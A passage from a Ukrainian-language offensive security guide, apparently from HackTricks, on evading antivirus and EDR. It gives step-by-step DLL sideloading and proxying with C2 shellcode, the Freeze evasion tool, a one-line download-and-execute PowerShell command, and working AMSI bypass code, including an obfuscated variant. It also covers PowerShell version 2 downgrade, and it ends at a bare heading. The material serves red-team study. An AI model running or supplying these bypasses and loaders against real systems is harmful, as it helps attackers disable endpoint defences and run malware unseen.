–Ø –Ω–∞—Å—Ç—ñ–π–Ω–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –≤–∞–º **—Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ –¥–æ—Å–ª—ñ–¥–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –ø—ñ–¥–º—ñ–Ω–∏—Ç–∏/–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ DLL**, —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–æ—Å–∏—Ç—å –Ω–µ–ø–æ–º—ñ—Ç–Ω–∞, —è–∫—â–æ —ó—ó –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏, –∞–ª–µ —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –ø—É–±–ª—ñ—á–Ω–æ –≤—ñ–¥–æ–º—ñ –ø—Ä–æ–≥—Ä–∞–º–∏, —è–∫—ñ –º–æ–∂–Ω–∞ –ø—ñ–¥–º—ñ–Ω–∏—Ç–∏ DLL, –≤–∞—Å –º–æ–∂—É—Ç—å –ª–µ–≥–∫–æ —Å–ø—ñ–π–º–∞—Ç–∏.

–ü—Ä–æ—Å—Ç–æ —Ä–æ–∑–º—ñ—Å—Ç–∏–≤—à–∏ —à–∫—ñ–¥–ª–∏–≤—É DLL –∑ —ñ–º'—è–º, —è–∫–µ –ø—Ä–æ–≥—Ä–∞–º–∞ –æ—á—ñ–∫—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏, –Ω–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤–∞—à –≤–∞–Ω—Ç–∞–∂, –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–∞ –æ—á—ñ–∫—É—î –¥–µ—è–∫—ñ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ü—ñ—î—ó DLL. –©–æ–± –≤–∏—Ä—ñ—à–∏—Ç–∏ —Ü—é –ø—Ä–æ–±–ª–µ–º—É, –º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—î–º–æ —ñ–Ω—à—É —Ç–µ—Ö–Ω—ñ–∫—É, –∑–≤–∞–Ω—É **DLL Proxying/Forwarding**.

**DLL Proxying** –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –≤–∏–∫–ª–∏–∫–∏, —è–∫—ñ –ø—Ä–æ–≥—Ä–∞–º–∞ —Ä–æ–±–∏—Ç—å –∑ –ø—Ä–æ–∫—Å—ñ (—ñ —à–∫—ñ–¥–ª–∏–≤–æ—ó) DLL –¥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ—ó DLL, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å –ø—Ä–æ–≥—Ä–∞–º–∏ —Ç–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ–±—Ä–æ–±–ª—è—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ –≤–∞–Ω—Ç–∞–∂—É.

–Ø –±—É–¥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) –≤—ñ–¥ [@flangvik](https://twitter.com/Flangvik/)

–¶–µ –∫—Ä–æ–∫–∏, —è–∫—ñ —è –≤–∏–∫–æ–Ω–∞–≤:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
–û—Å—Ç–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∞ –Ω–∞–¥–∞—Å—Ç—å –Ω–∞–º 2 —Ñ–∞–π–ª–∏: —à–∞–±–ª–æ–Ω –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É DLL —Ç–∞ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—É DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

–û–±–∏–¥–≤–∞ –Ω–∞—à—ñ shellcode (–∑–∞–∫–æ–¥–æ–≤–∞–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [SGN](https://github.com/EgeBalci/sgn)) —Ç–∞ –ø—Ä–æ–∫—Å—ñ DLL –º–∞—é—Ç—å 0/26 —Ä—ñ–≤–µ–Ω—å –≤–∏—è–≤–ª–µ–Ω–Ω—è –Ω–∞ [antiscan.me](https://antiscan.me)! –Ø –± –Ω–∞–∑–≤–∞–≤ —Ü–µ —É—Å–ø—ñ—Ö–æ–º.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> –Ø **—â–∏—Ä–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—é** –≤–∞–º –ø–æ–¥–∏–≤–∏—Ç–∏—Å—è [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) –ø—Ä–æ DLL Sideloading, –∞ —Ç–∞–∫–æ–∂ [–≤—ñ–¥–µ–æ ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Ç–µ, —â–æ –º–∏ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–∏ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Freeze –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ shellcode —É –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–π —Å–ø–æ—Å—ñ–±.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> –£–Ω–∏–∫–Ω–µ–Ω–Ω—è - —Ü–µ –ø—Ä–æ—Å—Ç–æ –≥—Ä–∞ –≤ –∫—ñ—à–∫–∏-–º–∏—à–∫–∏, —Ç–µ, —â–æ –ø—Ä–∞—Ü—é—î —Å—å–æ–≥–æ–¥–Ω—ñ, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–æ –∑–∞–≤—Ç—Ä–∞, —Ç–æ–º—É –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø–æ–∫–ª–∞–¥–∞–π—Ç–µ—Å—è –ª–∏—à–µ –Ω–∞ –æ–¥–∏–Ω —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫—â–æ –º–æ–∂–ª–∏–≤–æ, —Å–ø—Ä–æ–±—É–π—Ç–µ –ø–æ—î–¥–Ω—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ —É–Ω–∏–∫–Ω–µ–Ω–Ω—è.

## AMSI (–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è)

AMSI –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è "[–±–µ–∑—Ñ–∞–π–ª–æ–≤–∏–º —à–∫—ñ–¥–ª–∏–≤–∏–º –ø—Ä–æ–≥—Ä–∞–º–∞–º](https://en.wikipedia.org/wiki/Fileless_malware)". –°–ø–æ—á–∞—Ç–∫—É –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –º–æ–≥–ª–∏ —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –ª–∏—à–µ **—Ñ–∞–π–ª–∏ –Ω–∞ –¥–∏—Å–∫—É**, —Ç–æ–º—É, —è–∫—â–æ –≤–∏ –º–æ–≥–ª–∏ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è **–±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ –ø–∞–º'—è—Ç—ñ**, –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å –Ω–µ –º—ñ–≥ –Ω—ñ—á–æ–≥–æ –∑—Ä–æ–±–∏—Ç–∏, —â–æ–± —Ü—å–æ–º—É –∑–∞–ø–æ–±—ñ–≥—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–µ –º–∞–≤ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ—ó –≤–∏–¥–∏–º–æ—Å—Ç—ñ.

–§—É–Ω–∫—Ü—ñ—è AMSI —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∞ –≤ —Ü—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ Windows.

- –ö–æ–Ω—Ç—Ä–æ–ª—å –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∞–±–æ UAC (–ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∞–≤ –¥–ª—è EXE, COM, MSI –∞–±–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ ActiveX)
- PowerShell (—Å–∫—Ä–∏–ø—Ç–∏, —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–∞ –¥–∏–Ω–∞–º—ñ—á–Ω–∞ –æ—Ü—ñ–Ω–∫–∞ –∫–æ–¥—É)
- Windows Script Host (wscript.exe —Ç–∞ cscript.exe)
- JavaScript —Ç–∞ VBScript
- –ú–∞–∫—Ä–æ—Å–∏ Office VBA

–í–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–Ω–∏–º —Ä—ñ—à–µ–Ω–Ω—è–º –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫—É —Å–∫—Ä–∏–ø—Ç—ñ–≤, –≤—ñ–¥–∫—Ä–∏–≤–∞—é—á–∏ –≤–º—ñ—Å—Ç —Å–∫—Ä–∏–ø—Ç—ñ–≤ —É —Ñ–æ—Ä–º—ñ, —è–∫–∞ —î —è–∫ –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ—é, —Ç–∞–∫ —ñ –Ω–µ –æ–±—Ñ—É—Å–∫–æ–≤–∞–Ω–æ—é.

–í–∏–∫–æ–Ω–∞–Ω–Ω—è `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` –≤–∏–∫–ª–∏—á–µ –Ω–∞—Å—Ç—É–ø–Ω–µ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è –≤ Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ –ø–µ—Ä–µ–¥—É—î `amsi:` —ñ –ø–æ—Ç—ñ–º —à–ª—è—Ö –¥–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É, –∑ —è–∫–æ–≥–æ –∑–∞–ø—É—Å—Ç–∏–≤—Å—è —Å–∫—Ä–∏–ø—Ç, —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É, powershell.exe

–ú–∏ –Ω–µ —Å–∫–∏–Ω—É–ª–∏ –∂–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª—É –Ω–∞ –¥–∏—Å–∫, –∞–ª–µ –≤—Å–µ –∂ –±—É–ª–∏ —Å–ø—ñ–π–º–∞–Ω—ñ –≤ –ø–∞–º'—è—Ç—ñ —á–µ—Ä–µ–∑ AMSI.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ **.NET 4.8**, –∫–æ–¥ C# —Ç–∞–∫–æ–∂ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ AMSI. –¶–µ –Ω–∞–≤—ñ—Ç—å –≤–ø–ª–∏–≤–∞—î –Ω–∞ `Assembly.Load(byte[])` –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ –ø–∞–º'—è—Ç—ñ. –û—Å—å —á–æ–º—É —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∏–∂—á—ñ –≤–µ—Ä—Å—ñ—ó .NET (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, 4.7.2 –∞–±–æ –Ω–∏–∂—á–µ) –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤ –ø–∞–º'—è—Ç—ñ, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ —É–Ω–∏–∫–Ω—É—Ç–∏ AMSI.

–Ñ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ AMSI:

- **–û–±—Ñ—É—Å–∫–∞—Ü—ñ—è**

–û—Å–∫—ñ–ª—å–∫–∏ AMSI –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø—Ä–∞—Ü—é—î –∑ —Å—Ç–∞—Ç–∏—á–Ω–∏–º–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è–º–∏, —Ç–æ–º—É –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Å–∫—Ä–∏–ø—Ç—ñ–≤, —è–∫—ñ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏, –º–æ–∂–µ –±—É—Ç–∏ —Ö–æ—Ä–æ—à–∏–º —Å–ø–æ—Å–æ–±–æ–º —É–Ω–∏–∫–Ω—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

–û–¥–Ω–∞–∫ AMSI –º–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Ä–æ–∑–æ–±—Ñ—É—Å–∫—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç–∏, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —É –Ω–∏—Ö —î –∫—ñ–ª—å–∫–∞ —à–∞—Ä—ñ–≤, —Ç–æ–º—É –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—è –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–≥–∞–Ω–∏–º –≤–∞—Ä—ñ–∞–Ω—Ç–æ–º –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ —Ü–µ –∑—Ä–æ–±–ª–µ–Ω–æ. –¶–µ —É—Å–∫–ª–∞–¥–Ω—é—î —É–Ω–∏–∫–Ω–µ–Ω–Ω—è. –•–æ—á–∞ —ñ–Ω–æ–¥—ñ –≤—Å–µ, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ —ñ–º–µ–Ω –∑–º—ñ–Ω–Ω–∏—Ö, —ñ –≤–∏ –±—É–¥–µ—Ç–µ –≤ –ø–æ—Ä—è–¥–∫—É, —Ç–æ–º—É —Ü–µ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —Ç–æ–≥–æ, –Ω–∞—Å–∫—ñ–ª—å–∫–∏ —â–æ—Å—å –±—É–ª–æ –ø–æ–∑–Ω–∞—á–µ–Ω–æ.

- **AMSI Bypass**

–û—Å–∫—ñ–ª—å–∫–∏ AMSI —Ä–µ–∞–ª—ñ–∑—É—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL —É –ø—Ä–æ—Ü–µ—Å powershell (—Ç–∞–∫–æ–∂ cscript.exe, wscript.exe —Ç–æ—â–æ), –π–æ–≥–æ –º–æ–∂–Ω–∞ –ª–µ–≥–∫–æ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏, –Ω–∞–≤—ñ—Ç—å –ø—Ä–∞—Ü—é—é—á–∏ —è–∫ –Ω–µ–ø—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á. –ß–µ—Ä–µ–∑ —Ü–µ–π –Ω–µ–¥–æ–ª—ñ–∫ —É —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó AMSI –¥–æ—Å–ª—ñ–¥–Ω–∏–∫–∏ –∑–Ω–∞–π—à–ª–∏ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ —É–Ω–∏–∫–Ω—É—Ç–∏ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AMSI.

**–ü—Ä–∏–º—É—Å–æ–≤–∞ –ø–æ–º–∏–ª–∫–∞**

–ü—Ä–∏–º—É—Å–æ–≤–µ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó AMSI (amsiInitFailed) –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ —Ç–æ–≥–æ, —â–æ –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –Ω–µ –±—É–¥–µ —ñ–Ω—ñ—Ü—ñ–π–æ–≤–∞–Ω–æ –∂–æ–¥–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è. –°–ø–æ—á–∞—Ç–∫—É —Ü–µ –±—É–ª–æ —Ä–æ–∑–∫—Ä–∏—Ç–æ [Matt Graeber](https://twitter.com/mattifestation), —ñ Microsoft —Ä–æ–∑—Ä–æ–±–∏–ª–∞ –ø—ñ–¥–ø–∏—Å, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –±—ñ–ª—å—à —à–∏—Ä–æ–∫–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
–í—Å–µ, —â–æ –±—É–ª–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ, —Ü–µ –æ–¥–∏–Ω —Ä—è–¥–æ–∫ –∫–æ–¥—É PowerShell, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ AMSI –Ω–µ–ø—Ä–∏–¥–∞—Ç–Ω–∏–º –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É PowerShell. –¶–µ–π —Ä—è–¥–æ–∫, –∑–≤–∏—á–∞–π–Ω–æ, –±—É–≤ –ø–æ–∑–Ω–∞—á–µ–Ω–∏–π —Å–∞–º–∏–º AMSI, —Ç–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–µ—è–∫—ñ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏.

–û—Å—å –º–æ–¥–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –æ–±—Ö—ñ–¥ AMSI, —è–∫–∏–π —è –≤–∑—è–≤ –∑ —Ü—å–æ–≥–æ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic n¬∫ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M√Ç¬£n√Ç¬£g' + 'e@+nt.Auto@' + '√Ç¬£tion.A' -join ''
$fdx = '@ms' + '√Ç¬£In√Ç¬£' + 'tF@√Ç¬£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('√Ç¬£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('√Ç¬£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ –ø–æ–∑–Ω–∞—á–µ–Ω–æ, –∫–æ–ª–∏ —Ü–µ–π –ø–æ—Å—Ç –≤–∏–π–¥–µ, —Ç–æ–º—É –Ω–µ –ø—É–±–ª—ñ–∫—É–π—Ç–µ –∂–æ–¥–Ω–æ–≥–æ –∫–æ–¥—É, —è–∫—â–æ –≤–∞—à –ø–ª–∞–Ω –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –∑–∞–ª–∏—à–∏—Ç–∏—Å—è –Ω–µ–ø–æ–º—ñ—á–µ–Ω–∏–º.

**Memory Patching**

–¶—é —Ç–µ—Ö–Ω—ñ–∫—É —Å–ø–æ—á–∞—Ç–∫—É –≤–∏—è–≤–∏–≤ [@RastaMouse](https://twitter.com/_RastaMouse/), —ñ –≤–æ–Ω–∞ –ø–æ–ª—è–≥–∞—î —É –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—ñ –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ—ó "AmsiScanBuffer" –≤ amsi.dll (–≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ—ó –∑–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–≤–µ–¥–µ–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –¥–∞–Ω–∏—Ö) —Ç–∞ –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞–Ω–Ω—ñ —ó—ó —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è–º–∏, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –∫–æ–¥ –¥–ª—è E_INVALIDARG, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ñ–∞–∫—Ç–∏—á–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ–≤–µ—Ä–Ω–µ 0, —â–æ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î—Ç—å—Å—è —è–∫ —á–∏—Å—Ç–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç.

> [!TIP]
> –ë—É–¥—å –ª–∞—Å–∫–∞, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) –¥–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è.

–Ü—Å–Ω—É—î —Ç–∞–∫–æ–∂ –±–∞–≥–∞—Ç–æ —ñ–Ω—à–∏—Ö —Ç–µ—Ö–Ω—ñ–∫, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –æ–±—Ö–æ–¥—É AMSI –∑ PowerShell, –æ–∑–Ω–∞–π–æ–º—Ç–µ—Å—è –∑ [**—Ü—ñ—î—é —Å—Ç–æ—Ä—ñ–Ω–∫–æ—é**](basic-powershell-for-pentesters/index.html#amsi-bypass) —Ç–∞ [**—Ü–∏–º —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—î–º**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –Ω–∏—Ö.

–¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) —Ç–∞–∫–æ–∂ –≥–µ–Ω–µ—Ä—É—î —Å–∫—Ä–∏–ø—Ç –¥–ª—è –æ–±—Ö–æ–¥—É AMSI.

**Remove the detected signature**

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —Ç–∞–∫–∏–π —è–∫ **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** —Ç–∞ **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, —â–æ–± –≤–∏–¥–∞–ª–∏—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–∏–π –ø—ñ–¥–ø–∏—Å AMSI –∑ –ø–∞–º'—è—Ç—ñ –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É. –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø—Ä–∞—Ü—é—î, —Å–∫–∞–Ω—É—é—á–∏ –ø–∞–º'—è—Ç—å –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø—ñ–¥–ø–∏—Å—É AMSI, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–ø–∏—Å—É—é—á–∏ –π–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è–º–∏ NOP, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤–∏–¥–∞–ª—è—é—á–∏ –π–æ–≥–æ –∑ –ø–∞–º'—è—Ç—ñ.

**AV/EDR products that uses AMSI**

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–¥—É–∫—Ç—ñ–≤ AV/EDR, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å AMSI, –Ω–∞ **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
–Ø–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ PowerShell –≤–µ—Ä—Å—ñ—ó 2, AMSI –Ω–µ –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å–∫–∞—Ç–∏ —Å–≤–æ—ó —Å–∫—Ä–∏–ø—Ç–∏ –±–µ–∑ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AMSI. –í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ:
```bash
powershell.exe -version 2
```
## PS Logging

